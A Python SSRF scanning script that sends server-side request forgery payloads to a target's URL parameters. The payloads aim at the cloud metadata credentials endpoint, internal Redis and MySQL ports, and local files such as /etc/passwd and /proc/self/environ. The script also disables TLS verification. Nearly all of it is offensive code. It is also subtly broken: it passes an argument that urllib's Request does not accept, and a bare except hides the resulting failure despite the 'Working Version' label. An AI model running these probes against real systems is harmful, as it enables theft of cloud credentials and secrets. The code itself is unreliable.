#!/usr/bin/env python3
"""TERMINAL 4: SSRF SCANNER - Working Version"""
import os, sys, json, urllib.request, urllib.parse, urllib.error
from datetime import datetime
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    workspace = sys.argv[2] if len(sys.argv) > 2 else "/tmp/scan"
    
    print(f"[+] TERMINAL 4: SSRF Scanner Started")
    print(f"[+] Target: {target}")
    
    os.makedirs(f"{workspace}/results", exist_ok=True)
    result_file = f"{workspace}/results/ssrf_scan.json"
    
    results = {"terminal": 4, "name": "SSRF Scanner", "target": target,
        "start_time": datetime.now().isoformat(), "status": "running",
        "vulnerabilities": [], "tested_urls": [], "log": ""}
    
    log_lines = []
    def log(msg):
        print(msg)
        log_lines.append(msg)
    
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://localhost:22/", "http://127.0.0.1:80/", "http://127.0.0.1:3306/",
        "http://127.0.0.1:8080/", "http://127.0.0.1:6379/",  # Redis
        "http://0.0.0.0:80/", "http://[::]:80/",  # IPv6
        "file:///etc/passwd", "file:///etc/hosts", "file:///proc/self/environ",
        "http://internal/", "http://10.0.0.1/", "http://192.168.1.1/"
    ]
    
    test_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'src', 'endpoint', 'callback', 'next']
    test_urls = [f"http://{target}/", f"http://{target}/fetch", f"http://{target}/proxy", f"http://{target}/api/proxy", f"http://{target}/load", f"http://{target}/webhook"]
    
    log("[*] Testing for SSRF vulnerabilities...")
    
    for base_url in test_urls:
        for param in test_params[:5]:
            for payload in ssrf_payloads[:6]:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                results['tested_urls'].append(test_url)
                
                try:
                    req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}, timeout=10)
                    with urllib.request.urlopen(req) as response:
                        content = response.read().decode('utf-8', errors='ignore')
                        
                        indicators = [
                            ('root:', '/etc/passwd content'),
                            ('ec2-user', 'AWS EC2 metadata'),
                            ('ami-id', 'AWS AMI ID'),
                            ('instance-id', 'AWS Instance ID'),
                            ('localhost', 'localhost reference'),
                            ('127.0.0.1', 'loopback reference'),
                            ('internal', 'internal network'),
                            ('redis_version', 'Redis exposed'),
                            ('mysql_native_password', 'MySQL exposed')
                        ]
                        
                        for indicator, desc in indicators:
                            if indicator.lower() in content.lower():
                                log(f"[!] SSRF VULNERABILITY FOUND!")
                                log(f"  [+] URL: {test_url[:70]}")
                                log(f"  [+] Evidence: {desc}")
                                results['vulnerabilities'].append({
                                    'type': 'Server-Side Request Forgery (SSRF)',
                                    'severity': 'Critical',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': desc
                                })
                                break
                                
                except urllib.error.HTTPError as e:
                    if e.code in [500, 502, 503]:
                        log(f"[!] Server error (possible SSRF): {param}")
                except: pass
    
    results['status'] = 'completed'
    results['end_time'] = datetime.now().isoformat()
    results['log'] = '\n'.join(log_lines)
    
    with open(result_file, 'w') as f:
        json.dump(results, f, indent=2)
    log(f"[+] SSRF complete! {len(results['vulnerabilities'])} vulns found")

if __name__ == '__main__':
    main()
